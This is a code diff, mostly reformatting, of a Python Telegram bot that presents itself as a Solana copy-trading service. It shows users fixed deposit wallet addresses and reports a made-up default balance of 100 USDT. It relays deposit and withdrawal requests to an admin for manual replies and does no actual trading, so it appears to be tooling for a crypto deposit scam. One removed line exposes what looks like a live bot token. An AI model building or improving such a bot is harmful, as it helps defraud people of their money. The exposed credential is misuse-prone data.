@@ -1,6 +1,4 @@
 """
-
-
 ETH
  
 
@@ -47,8 +45,9 @@ import uuid
 
 
 # Bot token and admin chat ID
-BOT_TOKEN = "8928942777:AAGMydJ9-B0hZ8myETPkXWdhEHCACn0XO_A"  # Replace with your actual bot token
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your actual bot token
 ADMIN_CHAT_ID = 7008702272 #8744932799  # Replace this with your admin chat  ID
+
 # Deposit wallets shown to users, in display order
 DEPOSIT_WALLETS = [
     ("Solana", "3AWvcyVNtw5vg5nPrzgWU5aL3AbkH9hQRMhXBAwriFsA"),
@@ -73,6 +72,7 @@ def format_wallets() -> str:
         for name, address in DEPOSIT_WALLETS
     )
 
+
 # Conversation states for withdrawal
 # WALLET_ADDRESS, AMOUNT = range(2)
 WITHDRAW_WALLET, WITHDRAW_AMOUNT, DEPOSIT_AMOUNT, DEPOSIT_ADDRESS = range(4)
@@ -83,20 +83,23 @@ user_jobs = {}
 
 INACTIVITY_TIMEOUT = 120  # 2 minutes timeout
 
+
 # Start command
 # async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 #     await update.message.reply_text(
 #         "Solana's fastest bot to copy trade any coin (SPL token). Deposit SOL to start trading.\n"
 #         "How can I assist you? Use the buttons below to interact."
 #     )
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = html.escape(
         update.effective_user.username or update.effective_user.first_name or "there"
     )
+
     await notify_admin(context, update, "/start")
 
     await update.message.reply_text(
-f"""🚀 Welcome to GGJGMbot 🚀
+        f"""🚀 Welcome to GGJGMbot 🚀
 
 Hello @{username}!
 
@@ -136,10 +139,15 @@ Type any command above to get started.
 """,
         parse_mode="HTML",
     )
+
     #await reset_inactivity_timer(context, update.effective_user.id)
 
+
 # Reset inactivity timer
-async def reset_inactivity_timer(context: ContextTypes.DEFAULT_TYPE, user_id: int):
+async def reset_inactivity_timer(
+    context: ContextTypes.DEFAULT_TYPE,
+    user_id: int
+):
     if context.job_queue is None:
         print("Error: JobQueue not initialized.")
         return
@@ -149,8 +157,14 @@ async def reset_inactivity_timer(context: ContextTypes.DEFAULT_TYPE, user_id: in
         user_jobs[user_id].schedule_removal()
 
     # Schedule new inactivity job
-    job = context.job_queue.run_once(send_inactivity_message, INACTIVITY_TIMEOUT, chat_id=user_id)
+    job = context.job_queue.run_once(
+        send_inactivity_message,
+        INACTIVITY_TIMEOUT,
+        chat_id=user_id
+    )
+
     user_jobs[user_id] = job
+
 
 # Send inactivity message
 async def send_inactivity_message(context: ContextTypes.DEFAULT_TYPE):
@@ -159,6 +173,7 @@ async def send_inactivity_message(context: ContextTypes.DEFAULT_TYPE):
         text="You've been inactive for 2 minutes. Type /start to continue."
     )
 
+
 # Wallet command
 async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -166,7 +181,9 @@ async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Tap an address to copy it, then send from the matching network to deposit.",
         parse_mode="HTML",
     )
+
     #await reset_inactivity_timer(context, update.effective_user.id)
+
 
 # Balance command
 async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -178,11 +195,17 @@ async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Send balance request notification to the admin
     balance = user_balances.get(user_id, 100)  # Default balance = 100 USDT for new users
+
     await context.bot.send_message(
         chat_id=ADMIN_CHAT_ID,
-        text=f"User @{username} (ID: {user_id}) has requested their balance. Current balance: {balance} USDT."
+        text=(
+            f"User @{username} (ID: {user_id}) has requested their balance. "
+            f"Current balance: {balance} USDT."
+        )
     )
+
     #await reset_inactivity_timer(context, update.effective_user.id)
+
 
 # Admin reply handler
 async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -190,23 +213,39 @@ async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return  # Ignore messages not from the admin
 
     command_parts = update.message.text.split(maxsplit=2)
+
     if len(command_parts) < 3:
-        await update.message.reply_text("Usage: /reply <user_id> <your message>")
+        await update.message.reply_text(
+            "Usage: /reply <user_id> <your message>"
+        )
         return
 
     user_id_raw = command_parts[1]
     reply_message = command_parts[2]
 
     if not user_id_raw.isdigit():
-        await update.message.reply_text("Error: The user ID must be a valid number.")
+        await update.message.reply_text(
+            "Error: The user ID must be a valid number."
+        )
         return
 
     user_id = int(user_id_raw)
+
     try:
-        await context.bot.send_message(chat_id=user_id, text=f"{reply_message}")
-        await update.message.reply_text(f"Message successfully sent to user {user_id}.")
+        await context.bot.send_message(
+            chat_id=user_id,
+            text=f"{reply_message}"
+        )
+
+        await update.message.reply_text(
+            f"Message successfully sent to user {user_id}."
+        )
+
     except Exception as e:
-        await update.message.reply_text(f"Failed to send message: {e}")
+        await update.message.reply_text(
+            f"Failed to send message: {e}"
+        )
+
 
 async def notify_admin(
     context: ContextTypes.DEFAULT_TYPE,
@@ -225,8 +264,9 @@ async def notify_admin(
             f"🆔 User ID: <code>{user.id}</code>\n"
             f"⚡ Command: {command}"
         ),
-	parse_mode="HTML"
+        parse_mode="HTML"
     )
+
 
 async def invalid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -239,7 +279,8 @@ async def invalid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/withdraw\n"
         "/copytrade\n"
         "/cancel"
-	)
+    )
+
 
 # Withdraw command - Step 1: Ask for wallet address
 # async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -249,6 +290,7 @@ async def invalid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 #     )
 #     #await reset_inactivity_timer(context, update.effective_user.id)
 #     return WITHDRAW_WALLET
+
 async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await notify_admin(context, update, "/withdraw")
@@ -260,6 +302,7 @@ async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     return WITHDRAW_AMOUNT
+
 
 # Withdraw Step 2: Get wallet address and ask for amount
 # async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -299,6 +342,8 @@ async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 #     #await reset_inactivity_timer(context, update.effective_user.id)
 #     return ConversationHandler.END
+
+
 async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     amount = update.message.text.strip()
@@ -382,13 +427,22 @@ Reply using:
 
 # Cancel withdrawal
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Withdrawal process canceled.", reply_markup=ReplyKeyboardRemove())
-    await reset_inactivity_timer(context, update.effective_user.id)
+    await update.message.reply_text(
+        "Withdrawal process canceled.",
+        reply_markup=ReplyKeyboardRemove()
+    )
+
+    await reset_inactivity_timer(
+        context,
+        update.effective_user.id
+    )
+
     return ConversationHandler.END
 
 
 async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await notify_admin(context, update, "/deposit")
+
     await update.message.reply_text(
         f"""💰 Your Deposit Addresses
 
@@ -403,6 +457,7 @@ async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     return DEPOSIT_AMOUNT
 
+
 async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     amount_text = update.message.text.strip()
 
@@ -416,6 +471,7 @@ async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "Please enter a valid deposit amount."
         )
+
         return DEPOSIT_AMOUNT
 
     context.user_data["deposit_amount"] = amount
@@ -439,7 +495,7 @@ async def deposit_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
     deposit_id = str(uuid.uuid4())
 
     await update.message.reply_text(
-                f"""✅ Deposit request submitted successfully!
+        f"""✅ Deposit request submitted successfully!
 
                 📋 Deposit ID: `{deposit_id}`
 
@@ -450,25 +506,28 @@ async def deposit_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
                 ⏳ Status: Pending confirmation
                 """,
-                parse_mode="Markdown"
-        )
+        parse_mode="Markdown"
+    )
 
-    await context.bot.send_message(chat_id=ADMIN_CHAT_ID,text=f"""📥 NEW DEPOSIT REQUEST \n👤 User: @{user.username}
-            🆔 User ID: {user.id}
+    await context.bot.send_message(
+        chat_id=ADMIN_CHAT_ID,
+        text=f"""📥 NEW DEPOSIT REQUEST 
+👤 User: @{user.username}
+🆔 User ID: {user.id}
 
-            💰 Amount: {amount} SOL
+💰 Amount: {amount} SOL
 
-            🏦 Address:
-            {address}
+🏦 Address:
+{address}
 
-            📋 Deposit ID:
-            {deposit_id}
+📋 Deposit ID:
+{deposit_id}
 
-            Reply using:
+Reply using:
 
-            /reply {user.id} <message>
-            """
-        )
+/reply {user.id} <message>
+"""
+    )
 
     return ConversationHandler.END
 
@@ -526,25 +585,35 @@ Reply using:
 
     return ConversationHandler.END
 
+
 # Main function
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     # Conversation handler for withdrawal
     deposit_handler = ConversationHandler(
-        entry_points=[CommandHandler("deposit", deposit)],
+        entry_points=[
+            CommandHandler("deposit", deposit)
+        ],
         states={
             DEPOSIT_AMOUNT: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)
+                MessageHandler(
+                    filters.TEXT & ~filters.COMMAND,
+                    deposit_amount
+                )
             ],
             DEPOSIT_ADDRESS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_address)
+                MessageHandler(
+                    filters.TEXT & ~filters.COMMAND,
+                    deposit_address
+                )
             ],
         },
         fallbacks=[
             CommandHandler("cancel", cancel)
         ],
     )
+
     # withdraw_handler = ConversationHandler(
     #     entry_points=[CommandHandler("withdraw", withdraw)],
     #     states={
@@ -578,7 +647,6 @@ def main():
         ],
     )
 
-
     copytrade_handler = ConversationHandler(
         entry_points=[
             CommandHandler("copytrade", copytrade)
@@ -604,10 +672,11 @@ def main():
     app.add_handler(CommandHandler("balance", balance))
     app.add_handler(withdraw_handler)
     app.add_handler(deposit_handler)
-    # app.add_handler(CommandHandler("copytrade", copytrade))
-    app.add_handler(MessageHandler(filters.TEXT & filters.Chat(ADMIN_CHAT_ID), admin_reply))
-	app.add_handler(CommandHandler("reply", admin_reply))
 
+    # Admin reply handler
+    app.add_handler(CommandHandler("reply", admin_reply))
+
+    # Invalid text/command handler
     app.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND,
         invalid_command
@@ -615,6 +684,7 @@ def main():
 
     print("Bot is running...")
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
